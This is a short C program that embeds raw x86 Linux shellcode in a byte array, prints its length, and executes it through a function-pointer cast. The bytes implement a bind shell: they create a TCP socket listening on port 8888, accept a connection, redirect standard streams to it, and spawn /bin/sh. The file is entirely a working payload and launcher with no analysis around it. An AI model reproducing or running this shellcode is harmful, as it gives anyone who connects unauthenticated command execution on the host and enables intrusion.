#include<stdio.h>
#include<string.h>
int main(int argc, char* argv[])
{
	unsigned char code[] = \
	"\x6a\x66\x58\x99\x53\x43\x53\x6a\x02\x89\xe1\xcd"
	"\x80\x5b\x5e\x52\x66\x68"
	"\x22\xb8"
	"\x52\x6a\x02\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd"
	"\x80\x5a\x58\x31\xc0\x50\x52\x99\xb3\x04\xb0\x66"
	"\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd"
	"\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	"\x62\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80";
	printf("\nShellcode 1 Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

